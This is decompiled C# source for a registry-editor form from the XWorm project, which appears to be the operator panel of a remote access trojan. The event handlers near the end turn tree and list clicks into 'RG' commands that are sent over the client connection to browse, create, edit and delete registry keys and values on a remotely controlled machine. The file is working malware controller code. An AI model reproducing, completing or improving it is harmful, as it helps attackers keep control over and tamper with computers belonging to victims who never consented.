#define DEBUG
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm;

[DesignerGenerated]
public class Registry : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__R92_002D8
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R92_002D8(_Closure_0024__R92_002D8 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R10(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__R96_002D12
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R96_002D12(_Closure_0024__R96_002D12 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R14(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RGk")]
	private TreeView _RGk;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RefreshToolStripMenuItem2")]
	private ToolStripMenuItem _RefreshToolStripMenuItem2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AddToolStripMenuItem1")]
	private ToolStripMenuItem _AddToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RemoveToolStripMenuItem1")]
	private ToolStripMenuItem _RemoveToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem1")]
	private ToolStripMenuItem _ToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("NewValueToolStripMenuItem1")]
	private ToolStripMenuItem _NewValueToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EditToolStripMenuItem1")]
	private ToolStripMenuItem _EditToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DeleteToolStripMenuItem1")]
	private ToolStripMenuItem _DeleteToolStripMenuItem1;

	public GClass5 gclass5_0;

	[field: AccessedThroughProperty("StatusStrip1")]
	public StatusStrip StatusStrip1
	;

	[field: AccessedThroughProperty("ToolStripStatusLabel1")]
	public ToolStripStatusLabel ToolStripStatusLabel1
	;

	public TreeView RGk
;

	[field: AccessedThroughProperty("img")]
	public ImageList img
	;

	public ListView ListView1
	;
	[field: AccessedThroughProperty("ColumnHeader1")]
	public ColumnHeader ColumnHeader1
	;

	[field: AccessedThroughProperty("ColumnHeader2")]
	public ColumnHeader ColumnHeader2
	;

	[field: AccessedThroughProperty("ColumnHeader3")]
	public ColumnHeader ColumnHeader3
	;

	public System.Windows.Forms.Timer Timer1
	;

	[field: AccessedThroughProperty("Splitter1")]
	public Splitter Splitter1
	;

	[field: AccessedThroughProperty("ToolStripProgressBar1")]
	public ToolStripProgressBar ToolStripProgressBar1
	;

	[field: AccessedThroughProperty("Guna2ContextMenuStrip2")]
	public Guna2ContextMenuStrip Guna2ContextMenuStrip2
	;

	public ToolStripMenuItem RefreshToolStripMenuItem2

		;

	public ToolStripMenuItem AddToolStripMenuItem1
;

	public ToolStripMenuItem RemoveToolStripMenuItem1
	;

	[field: AccessedThroughProperty("Guna2ContextMenuStrip1")]
	public Guna2ContextMenuStrip Guna2ContextMenuStrip2_1
;

	public ToolStripMenuItem ToolStripMenuItem1
	;

	public ToolStripMenuItem NewValueToolStripMenuItem1
	;

	public ToolStripMenuItem EditToolStripMenuItem1
	;

	public ToolStripMenuItem DeleteToolStripMenuItem1
	;

	public Registry()
	{
		base.FormClosing += Registry_FormClosing;
		InitializeComponent();
		this.img.Images.SetKeyName(0, "image0.png");
		this.img.Images.SetKeyName(1, "1.png");
		this.img.Images.SetKeyName(2, "2.png");
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.TreeNode treeNode = new System.Windows.Forms.TreeNode("HKEY_CLASSES_ROOT");
		System.Windows.Forms.TreeNode treeNode2 = new System.Windows.Forms.TreeNode("HKEY_CURRENT_USER");
		System.Windows.Forms.TreeNode treeNode3 = new System.Windows.Forms.TreeNode("HKEY_LOCAL_MACHINE");
		System.Windows.Forms.TreeNode treeNode4 = new System.Windows.Forms.TreeNode("HKEY_USERS");
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.Registry));
		this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
		this.ToolStripProgressBar1 = new System.Windows.Forms.ToolStripProgressBar();
		this.ToolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.RGk = new System.Windows.Forms.TreeView();
		this.img = new System.Windows.Forms.ImageList(this.components);
		this.ListView1 = new System.Windows.Forms.ListView();
		this.ColumnHeader1 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader2 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader3 = new System.Windows.Forms.ColumnHeader();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.Splitter1 = new System.Windows.Forms.Splitter();
		this.Guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		this.AddToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RemoveToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.RefreshToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.Guna2ContextMenuStrip2_1 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
		this.ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.NewValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.EditToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.DeleteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.StatusStrip1.SuspendLayout();
		this.Guna2ContextMenuStrip2.SuspendLayout();
		this.Guna2ContextMenuStrip2_1.SuspendLayout();
		base.SuspendLayout();
		this.RGk.DoubleClick += new System.EventHandler(RGk_DoubleClick);
		this.ListView1.DoubleClick += new System.EventHandler(ListView1_DoubleClick);
		this.ListView1.KeyDown += new System.Windows.Forms.KeyEventHandler(ListView1_KeyDown);
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.RefreshToolStripMenuItem2.Click += new System.EventHandler(RefreshToolStripMenuItem2_Click);
		this.AddToolStripMenuItem1.Click += new System.EventHandler(AddToolStripMenuItem1_Click);
		this.RemoveToolStripMenuItem1.Click += new System.EventHandler(RemoveToolStripMenuItem1_Click);
		this.ToolStripMenuItem1.Click += new System.EventHandler(ToolStripMenuItem1_Click);
		this.NewValueToolStripMenuItem1.Click += new System.EventHandler(NewValueToolStripMenuItem1_Click);
		this.EditToolStripMenuItem1.Click += new System.EventHandler(EditToolStripMenuItem1_Click);
		this.DeleteToolStripMenuItem1.Click += new System.EventHandler(DeleteToolStripMenuItem1_Click);
		this.StatusStrip1.BackColor = System.Drawing.Color.White;
		this.StatusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.ToolStripProgressBar1, this.ToolStripStatusLabel1 });
		this.StatusStrip1.Location = new System.Drawing.Point(0, 328);
		this.StatusStrip1.Name = "StatusStrip1";
		this.StatusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
		this.StatusStrip1.Size = new System.Drawing.Size(636, 22);
		this.StatusStrip1.TabIndex = 5;
		this.StatusStrip1.Text = "v";
		this.ToolStripProgressBar1.Name = "ToolStripProgressBar1";
		this.ToolStripProgressBar1.Size = new System.Drawing.Size(100, 16);
		this.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
		this.ToolStripStatusLabel1.Size = new System.Drawing.Size(13, 17);
		this.ToolStripStatusLabel1.Text = "..";
		this.RGk.BackColor = System.Drawing.Color.White;
		this.RGk.ContextMenuStrip = this.Guna2ContextMenuStrip2;
		this.RGk.Dock = System.Windows.Forms.DockStyle.Left;
		this.RGk.ForeColor = System.Drawing.Color.Black;
		this.RGk.ImageIndex = 0;
		this.RGk.ImageList = this.img;
		this.RGk.Location = new System.Drawing.Point(0, 0);
		this.RGk.Name = "RGk";
		treeNode.ImageIndex = -2;
		treeNode.Name = "HKEY_CLASSES_ROOT";
		treeNode.Text = "HKEY_CLASSES_ROOT";
		treeNode2.ImageIndex = -2;
		treeNode2.Name = "HKEY_CURRENT_USER";
		treeNode2.Text = "HKEY_CURRENT_USER";
		treeNode3.ImageIndex = -2;
		treeNode3.Name = "HKEY_LOCAL_MACHINE";
		treeNode3.Text = "HKEY_LOCAL_MACHINE";
		treeNode4.ImageIndex = -2;
		treeNode4.Name = "HKEY_USERS";
		treeNode4.Text = "HKEY_USERS";
		this.RGk.Nodes.AddRange(new System.Windows.Forms.TreeNode[4] { treeNode, treeNode2, treeNode3, treeNode4 });
		this.RGk.SelectedImageIndex = 0;
		this.RGk.Size = new System.Drawing.Size(200, 328);
		this.RGk.TabIndex = 10;
		this.img.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("img.ImageStream");
		this.img.TransparentColor = System.Drawing.Color.Transparent;
		this.ListView1.BackColor = System.Drawing.Color.White;
		this.ListView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.ListView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[3] { this.ColumnHeader1, this.ColumnHeader2, this.ColumnHeader3 });
		this.ListView1.ContextMenuStrip = this.Guna2ContextMenuStrip2_1;
		this.ListView1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.ListView1.Font = new System.Drawing.Font("Tahoma", 8f);
		this.ListView1.ForeColor = System.Drawing.Color.Black;
		this.ListView1.FullRowSelect = true;
		this.ListView1.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
		this.ListView1.HideSelection = false;
		this.ListView1.Location = new System.Drawing.Point(200, 0);
		this.ListView1.Name = "ListView1";
		this.ListView1.Size = new System.Drawing.Size(436, 328);
		this.ListView1.SmallImageList = this.img;
		this.ListView1.TabIndex = 11;
		this.ListView1.UseCompatibleStateImageBehavior = false;
		this.ListView1.View = System.Windows.Forms.View.Details;
		this.ColumnHeader1.Text = "[ Name ]";
		this.ColumnHeader1.Width = 105;
		this.ColumnHeader2.Text = "[ Type ]";
		this.ColumnHeader2.Width = 125;
		this.ColumnHeader3.Text = "[ Value ]";
		this.ColumnHeader3.Width = 131;
		this.Timer1.Enabled = true;
		this.Timer1.Interval = 1000;
		this.Splitter1.BackColor = System.Drawing.Color.White;
		this.Splitter1.Location = new System.Drawing.Point(200, 0);
		this.Splitter1.Name = "Splitter1";
		this.Splitter1.Size = new System.Drawing.Size(3, 328);
		this.Splitter1.TabIndex = 12;
		this.Splitter1.TabStop = false;
		this.Guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.RefreshToolStripMenuItem2, this.AddToolStripMenuItem1, this.RemoveToolStripMenuItem1 });
		this.Guna2ContextMenuStrip2.Name = "Guna2ContextMenuStrip2";
		this.Guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
		this.Guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
		this.Guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(113, 74, 250);
		this.Guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.Guna2ContextMenuStrip2.Size = new System.Drawing.Size(142, 70);
		this.AddToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.AddToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("AddToolStripMenuItem1.Image");
		this.AddToolStripMenuItem1.Name = "AddToolStripMenuItem1";
		this.AddToolStripMenuItem1.Size = new System.Drawing.Size(141, 22);
		this.AddToolStripMenuItem1.Text = "[ CreateKey ]";
		this.RemoveToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.RemoveToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RemoveToolStripMenuItem1.Image");
		this.RemoveToolStripMenuItem1.Name = "RemoveToolStripMenuItem1";
		this.RemoveToolStripMenuItem1.Size = new System.Drawing.Size(141, 22);
		this.RemoveToolStripMenuItem1.Text = "[ DeleteKey ]";
		this.RefreshToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.RefreshToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("RefreshToolStripMenuItem2.Image");
		this.RefreshToolStripMenuItem2.Name = "RefreshToolStripMenuItem2";
		this.RefreshToolStripMenuItem2.Size = new System.Drawing.Size(141, 22);
		this.RefreshToolStripMenuItem2.Text = "[ Refresh ]";
		this.Guna2ContextMenuStrip2_1.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.ToolStripMenuItem1, this.NewValueToolStripMenuItem1, this.EditToolStripMenuItem1, this.DeleteToolStripMenuItem1 });
		this.Guna2ContextMenuStrip2_1.Name = "Guna2ContextMenuStrip2";
		this.Guna2ContextMenuStrip2_1.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(151, 143, 255);
		this.Guna2ContextMenuStrip2_1.RenderStyle.BorderColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2_1.RenderStyle.ColorTable = null;
		this.Guna2ContextMenuStrip2_1.RenderStyle.RoundedEdges = true;
		this.Guna2ContextMenuStrip2_1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2_1.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(113, 74, 250);
		this.Guna2ContextMenuStrip2_1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
		this.Guna2ContextMenuStrip2_1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
		this.Guna2ContextMenuStrip2_1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
		this.Guna2ContextMenuStrip2_1.Size = new System.Drawing.Size(181, 114);
		this.ToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem1.Image");
		this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
		this.ToolStripMenuItem1.Size = new System.Drawing.Size(140, 22);
		this.ToolStripMenuItem1.Text = "[ Refresh ]";
		this.NewValueToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.NewValueToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("NewValueToolStripMenuItem1.Image");
		this.NewValueToolStripMenuItem1.Name = "NewValueToolStripMenuItem1";
		this.NewValueToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.NewValueToolStripMenuItem1.Text = "[ NewValue ]";
		this.EditToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.EditToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("EditToolStripMenuItem1.Image");
		this.EditToolStripMenuItem1.Name = "EditToolStripMenuItem1";
		this.EditToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.EditToolStripMenuItem1.Text = "[ Edit ]";
		this.DeleteToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.DeleteToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("DeleteToolStripMenuItem1.Image");
		this.DeleteToolStripMenuItem1.Name = "DeleteToolStripMenuItem1";
		this.DeleteToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.DeleteToolStripMenuItem1.Text = "[ Delete ]";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(636, 350);
		base.Controls.Add(this.Splitter1);
		base.Controls.Add(this.ListView1);
		base.Controls.Add(this.RGk);
		base.Controls.Add(this.StatusStrip1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "Registry";
		this.Text = "Registry Editor";
		this.StatusStrip1.ResumeLayout(false);
		this.StatusStrip1.PerformLayout();
		this.Guna2ContextMenuStrip2.ResumeLayout(false);
		this.Guna2ContextMenuStrip2_1.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void RGk_DoubleClick(object sender, EventArgs e)
	{
		if (RGk.SelectedNode != null)
		{
			byte[] array = Module0.smethod_6("RG" + GClass19.string_0 + "~" + GClass19.string_0 + RGk.SelectedNode.FullPath + "\\" + GClass19.string_0);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
			ToolStripStatusLabel1.ForeColor = Color.Black;
			ToolStripStatusLabel1.Text = "Wait..";
		}
	}

	private void ListView1_DoubleClick(object sender, EventArgs e)
	{
		if (ListView1.SelectedItems.Count != 0)
		{
			ListViewItem listViewItem = ListView1.SelectedItems[0];
			EditReg editReg = new EditReg();
			editReg.string_0 = RGk.SelectedNode.FullPath + "\\";
			editReg.gclass5_0 = gclass5_0;
			editReg.Guna2TextBox1.Text = listViewItem.Text;
			editReg.Guna2ComboBox1.SelectedIndex = editReg.Guna2ComboBox1.Items.IndexOf(listViewItem.SubItems[1].Text);
			try
			{
				editReg.Guna2TextBox3.Text = listViewItem.SubItems[2].Text;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			editReg.Text = editReg.string_0;
			editReg.Guna2TextBox1.ReadOnly = true;
			editReg.ShowDialog(this);
		}
	}

	private void ListView1_KeyDown(object sender, KeyEventArgs e)
	{
		try
		{
			if (e.Modifiers != Keys.Control || e.KeyCode != Keys.A || ListView1.Items.Count <= 0)
			{
				return;
			}
			foreach (ListViewItem item in ListView1.Items)
			{
				item.Selected = true;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Registry_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("CloseRegistry");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void RefreshToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (RGk.SelectedNode != null)
		{
			byte[] array = Module0.smethod_6("RG" + GClass19.string_0 + "~" + GClass19.string_0 + RGk.SelectedNode.FullPath + "\\");
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
			ToolStripStatusLabel1.ForeColor = Color.Black;
			ToolStripStatusLabel1.Text = "Wait..";
		}
	}

	private void AddToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (RGk.SelectedNode == null || !RGk.SelectedNode.FullPath.Contains("\\"))
		{
			return;
		}
		string text = Interaction.InputBox("Key Name?", "Create New Key", "Name");
		if (text.Length != 0)
		{
			byte[] array = Module0.smethod_6("RG" + GClass19.string_0 + "#" + GClass19.string_0 + RGk.SelectedNode.FullPath + "\\" + GClass19.string_0 + text);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void RemoveToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (RGk.SelectedNode == null)
		{
			return;
		}
		string fullPath = RGk.SelectedNode.FullPath;
		checked
		{
			if (fullPath.Contains("\\"))
			{
				string text = Strings.Split(fullPath, "\\")[Strings.Split(fullPath, "\\").Length - 1];
				string text2 = "";
				int num = Strings.Split(fullPath, "\\").Length - 2;
				for (int i = 0; i <= num; i++)
				{
					text2 = text2 + Strings.Split(fullPath, "\\")[i] + "\\";
				}
				byte[] array = Module0.smethod_6("RG" + GClass19.string_0 + "$" + GClass19.string_0 + text2 + GClass19.string_0 + text);
				_Closure_0024__R92_002D8 arg = default(_Closure_0024__R92_002D8);
				_Closure_0024__R92_002D8 CS_0024_003C_003E8__locals0 = new _Closure_0024__R92_002D8(arg);
				CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2 = gclass5_0;
				ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
				{
					CS_0024_003C_003E8__locals0._0024VB_0024NonLocal_2.method_1((byte[])a0);
				}, array);
				RGk.SelectedNode.Remove();
			}
		}
	}

	private void ToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (RGk.SelectedNode != null)
		{
			byte[] array = Module0.smethod_6("RG" + GClass19.string_0 + "~" + GClass19.string_0 + RGk.SelectedNode.FullPath + "\\");
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
			ToolStripStatusLabel1.ForeColor = Color.Black;
			ToolStripStatusLabel1.Text = "Wait..";
		}
	}

	private void NewValueToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		EditReg editReg = new EditReg();
		editReg.string_0 = RGk.SelectedNode.FullPath + "\\";
		editReg.gclass5_0 = gclass5_0;
		editReg.Guna2TextBox1.Text = "Name";
		editReg.Guna2ComboBox1.SelectedIndex = editReg.Guna2ComboBox1.Items.IndexOf("String");
		editReg.Guna2TextBox3.Text = "Value";
		editReg.Text = editReg.string_0;
		editReg.ShowDialog(this);
	}

	private void EditToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		ListView1_DoubleClick(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender)), e);
	}

	private void DeleteToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			IEnumerator enumerator = ListView1.SelectedItems.GetEnumerator();
			_Closure_0024__R96_002D12 closure_0024__R96_002D = default(_Closure_0024__R96_002D12);
			while (enumerator.MoveNext())
			{
				ListViewItem listViewItem = (ListViewItem)enumerator.Current;
				byte[] array = Module0.smethod_6("RG" + GClass19.string_0 + "@5" + GClass19.string_0 + RGk.SelectedNode.FullPath + "\\" + GClass19.string_0 + listViewItem.Text);
				closure_0024__R96_002D = new _Closure_0024__R96_002D12(closure_0024__R96_002D);
				closure_0024__R96_002D._0024VB_0024NonLocal_2 = gclass5_0;
				ThreadPool.QueueUserWorkItem(closure_0024__R96_002D._Lambda_0024__R14, array);
			}
		}
		finally
		{
		}
	}
}